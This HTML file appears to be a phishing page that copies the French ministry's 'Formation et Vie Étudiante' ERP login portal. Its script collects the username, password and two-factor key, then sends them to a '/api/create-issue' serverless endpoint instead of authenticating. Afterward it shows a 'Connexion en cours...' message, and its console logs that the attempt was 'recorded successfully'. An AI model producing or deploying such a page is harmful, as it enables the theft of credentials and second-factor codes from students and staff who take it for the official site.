<!DOCTYPE html>
<html lang="fr">
</head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Authentification - Formation et Vie Etudiante</title>
<link rel="icon" type="image/x-icon" href="favicon-FVE.ico">

<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #D7D7D7;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    
    .container {
        width: 100%;
        max-width: 400px;
    }
    
    .logo {
        text-align: center;
        margin-bottom: 2px;
    }
    
    .logo img {
        max-width: 277px;
        height: 112px;
    }
    
    .login-box {
        background-color: #F0F0F0;
        
        border-radius: 3px 3px 0px 0px;
        padding: 20px;
        
    }
    
    .login-header {
        text-align: center;
        color: #999999;
        margin-bottom: 20px;
    }
    
    .login-header h1 {
        font-size: 24px;
        margin: 0;
        font-weight: normal;
    }
    
    .login-header p {
        font-size: 20px;
        margin: 10px 0 0;
    }
    
    .form-group {
        margin-bottom: 15px;
    }
    
    .form-control {
        width: 100%;
        width: 372px;
        height:32px;
        padding: 10px;
        box-sizing: border-box;
        border: 1px solid #ccc;
        border-radius: 3px;
        font-size: 14px;
    }
    
    .btn-login {
        background-color: #27AE60;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 3px;
        cursor: pointer;
        font-size: 10px;
    }
    
    .btn-login:hover {
        background-color: #219955;
    }
    
    .form-footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 15px;
    }
    
    .checkbox-container {
        display: flex;
        align-items: center;
    }
    
    .forgot-password {
        text-align: center;
        background-color: #C4C4C4;
        padding: 10px;
        height:26.5px;
        top: 1px;
position: relative;
        
    }
    
    .forgot-password a {
        color: #555555;
        text-decoration:none;
        font-size: 13px;
        top: 4px;
position: relative;
    }

    .copyright a{
        text-decoration: none;
    }

    .copyright a:hover{
        text-decoration: underline;
text-decoration-style:solid;
    }


    .forgot-password a:hover {
        color: #555555;
        text-decoration: underline;
text-decoration-style:solid;
        font-size: 13px;
    }
    
    .copyright {
        text-align: center;
        font-size: 10px;
        color: #666;
        margin-top: 10px;
    }
    
    .version {
        text-align: center;
        font-size: 10px;
        color: #666;
        margin-top: 5px;
    }
      .input-with-icon {
position: relative;
}

.input-icon {
position: absolute;
top: 50%;
transform: translateY(-50%);
right: -3px;
border-left: 1px solid #A2A2A2;
padding-left: 4px;
}


.input-with-icon input {
/* padding-left: 35px;*/
}
</style>
<body>
    <div class="container">
        <div class="logo">
            <img src="logo.png" alt="Logo">
        </div>
       
        <div class="login-box">
            <div class="login-header">
                <h1>Progiciel de Gestion Intégré</h1>
                <p>Formation et Vie Étudiante</p>
            </div>
           
            <form id="loginForm">
                <div class="form-group">
                    <div class="input-with-icon">
                        <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="13" height="13" fill="#A2A2A2" stroke="#A2A2A2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                        </svg>
                        <input type="text" class="form-control" placeholder="Nom d'utilisateur" id="username" required>
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-with-icon">
                        <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="13" height="13" fill="#A2A2A2" stroke="#A2A2A2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path fill="none" d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                        <input type="password" class="form-control" placeholder="Mot de passe" id="password" required>
                    </div>
                </div>
               
                <div class="form-group">
                    <div class="input-with-icon">
                        <svg class="input-icon" style="padding-left: 3px;right:-5px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="8" cy="8" r="4"></circle>
                            <path d="M10.85 10.85 L16 16"></path>
                            <path d="M14 14 L17 11"></path>
                        </svg>
                        <input type="text" class="form-control" id="key" placeholder="clé double authentification">
                    </div>
                </div>
               
                <div class="form-footer">
                    <button type="submit" class="btn-login">Se connecter</button>
                   
                    <div class="checkbox-container">
                        <input type="checkbox" id="remember" checked>
                        <label for="remember" style="font-size: 13px;color:#404040">Rester connecté</label>
                    </div>
                </div>
            </form>
        </div>
       
        <div class="forgot-password">
            <a href="#">Mot de passe oublié ?</a>
        </div>
       
        <div class="copyright">
            Copyright 2025<b> <a href="#" style="color:#666666;">Ministère de l'Enseignement Supérieur et de la Recherche Scientifique</a></b>
        </div>
       
        <div class="version">
            version publiée le 04-02-2025 14:20
        </div>

        <div id="result"></div>
    </div>

    <script>
      // Inside your submit event listener
document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  const key = document.getElementById('key').value;
  
  // Call your Vercel serverless function on the same domain
  fetch('/api/create-issue', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      username,
      password,
      key
    })
  })
  .then(response => response.json())
  .then(data => {
    console.log('Success:', data);
    showResult('Login attempt recorded successfully!', true);
  })
  .catch(error => {
    console.error('Error:', error);
    showResult('Connexion en cours...', true);
  });
});
    </script>
</body>
</html>
